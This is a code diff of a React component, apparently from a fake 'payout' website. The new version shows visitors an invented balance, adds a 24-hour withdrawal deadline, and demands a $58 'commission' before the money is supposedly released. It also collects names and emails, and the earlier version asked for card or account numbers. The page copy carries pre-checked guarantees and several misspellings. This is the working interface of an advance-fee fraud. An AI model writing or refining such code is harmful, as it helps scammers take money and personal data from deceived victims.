@@ -10,20 +10,20 @@ import { thousandsFormatter } from "../../utils"
 import FillForm from "../../components/Blocks/FillForm"
 import FormCheckItem from "../../components/FormCheckItem"
 import { CHAT_LAST_PAGE, LAST_VISITED } from "../../constants"
+import CommissionForm from "../../components/Blocks/CommissionForm"
 
-// 2-1
+// 1-1
 const Commissionfp = () => {
   const [iName, setIName] = useState("")
+  const [iLastName, setILastName] = useState("")
   const [iEmail, setIEmail] = useState("")
-  const [iSelect, setISelect] = useState("Bank account")
-  const [iWallet, setIWallet] = useState("")
 
   const balance = useSelector(state => state.user.balance)
 
   const navigate = useNavigate()
 
   const handleSubmit = useCallback(() => {
-    navigate("/charlast")
+    navigate("/chatlast")
     localStorage.setItem(LAST_VISITED, CHAT_LAST_PAGE)
   }, [navigate])
 
@@ -41,16 +41,9 @@ const Commissionfp = () => {
     [setIName]
   )
 
-  const onSelectChange = useCallback(
+  const onLastNameChange = useCallback(
     event => {
-      setISelect(event.target.value)
-    },
-    [setIName]
-  )
-
-  const onWalletChange = useCallback(
-    event => {
-      setIWallet(event.target.value)
+      setILastName(event.target.value)
     },
     [setIName]
   )
@@ -65,26 +58,9 @@ const Commissionfp = () => {
         <Flex
           flexDir={"column"}
           alignItems={{ base: "center", md: "flex-start" }}
-          gridColumn={{ md: "2" }}
+          gridColumn={{ md: "1" }}
           justifyContent={{ md: "center" }}
         >
-          <Box
-            fontSize={{ base: "14px", sm: "18px" }}
-            color={"#21D233"}
-            background={"#E0F8E3"}
-            p={"10px"}
-            borderRadius={"4px"}
-            display={"flex"}
-            alignItems={"center"}
-            justifyContent={"center"}
-            gap={"10px"}
-            width={"fit-content"}
-            mb={"30px"}
-          >
-            <Icon as={AiOutlineCheckCircle} />
-            Money successfully credited to Swift
-          </Box>
-
           <Flex
             flexDir={{ base: "column", md: "row" }}
             alignItems={"center"}
@@ -92,13 +68,22 @@ const Commissionfp = () => {
           >
             <Box textAlign={{ base: "center", md: "left" }}>
               <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
-                Your payout is:
+                Your payout amount is:
               </Text>
               <Text
                 fontSize={{ base: "40px", md: "40px" }}
                 fontWeight={"bold"}
                 color={"brand.600"}
-              >{`$${thousandsFormatter(balance)}`}</Text>
+                background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
+                whiteSpace={"nowrap"}
+                sx={{
+                  WebkitBackgroundClip: "text",
+                  WebkitTextFillColor: "transparent"
+                }}
+              >
+                {`$${thousandsFormatter(balance)}`}
+                <Text as={"span"} fontSize={"18px"}> USD</Text>
+              </Text>
             </Box>
             <Text
               color={"pink.100"}
@@ -109,31 +94,67 @@ const Commissionfp = () => {
               You need to withdraw money within 24 hours!
             </Text>
           </Flex>
-        </Flex>
-        <FillForm
-          nameValue={iName}
-          emailValue={iEmail}
-          selectValue={iSelect}
-          walletValue={iWallet}
-          onNameChange={onNameChange}
-          onEmailChange={onEmailChange}
-          onSelectChange={onSelectChange}
-          onWalletChange={onWalletChange}
-          gridColumn={{ md: "1" }}
-          gridRow={{ md: "1/span 2" }}
-        />
-        <Flex flexDir={"column"} justifyContent={{ md: "center" }}>
-          <Text fontSize={{ base: "20px", md: "24px" }} mb={"15px"}>
-            Specify the details, to which you want to funds
+          <Text
+            fontSize={{ base: "20px", md: "24px" }}
+            fontWeight={"700"}
+            textAlign={"center"}
+            display={{ base: "inline-block", md: "none" }}
+            m={"30px 0 20px"}
+          >
+            The payment system requests a commission for transfer
           </Text>
-          <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
-            <FormCheckItem checked={!!iName} label={"Enter your full name"} />
-            <FormCheckItem checked={!!iEmail} label={"Email adress"} />
-            <FormCheckItem
-              checked={!!iWallet}
-              label={"Enter your account or card number"}
-            />
-          </Flex>
+          <Text>
+            In connection with the limits of pavment svstems, the transfer wil
+            be sent by two equal parts during <b>10 minutes</b>
+            <br /> <br />
+            You need to pay for the commission for the transfer of your money.
+            Atter paying for the commission, the transfer will be fully
+            successtully sent on details!
+          </Text>
+          <Box
+            mt={"30px"}
+            display={"flex"}
+            flexDir={"column"}
+            alignItems={"flex-start"}
+            width={"100%"}
+          >
+            <Text fontSize={{ base: "20px", md: "24px" }} mb={"15px"}>
+              The commission for transferring tunds is: <b>$58</b>
+            </Text>
+            <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
+              <FormCheckItem
+                checked={true}
+                label={"We guarantee you a quick payment"}
+              />
+              <FormCheckItem
+                checked={true}
+                label={"Pay the commission for the transfer"}
+              />
+              <FormCheckItem
+                checked={true}
+                label={"Get your payment within 10 minutes"}
+              />
+            </Flex>
+          </Box>
+        </Flex>
+        <Flex flexDir={"column"} justifyContent={{ md: "space-between" }}>
+          <Text
+            fontSize={{ base: "20px", md: "24px" }}
+            fontWeight={"700"}
+            display={{ base: "none", md: "inline-block" }}
+          >
+            The payment system requests a commission for transfer
+          </Text>
+          <CommissionForm
+            nameValue={iName}
+            emailValue={iEmail}
+            lastNameValue={iLastName}
+            onNameChange={onNameChange}
+            onEmailChange={onEmailChange}
+            onLastNameChange={onLastNameChange}
+            gridColumn={{ md: "1" }}
+            gridRow={{ md: "1/span 2" }}
+          />
         </Flex>
       </Box>
       <Flex
@@ -152,7 +173,7 @@ const Commissionfp = () => {
           alignItems={"center"}
         >
           <Button
-            isDisabled={!iName || !iEmail || !iSelect || !iWallet}
+            isDisabled={!iName || !iEmail || !iLastName}
             width={{ base: "190px", md: "230px" }}
             mb={"10px"}
             mr={{ md: "40px" }}
@@ -160,10 +181,6 @@ const Commissionfp = () => {
           >
             SEND
           </Button>
-          <Text fontSize={"18px"} fontWeight={"700"} opacity={"0.3"}>
-            a questionnaire <br />
-            to the manager
-          </Text>
         </Flex>
       </Flex>
     </ChatCard>
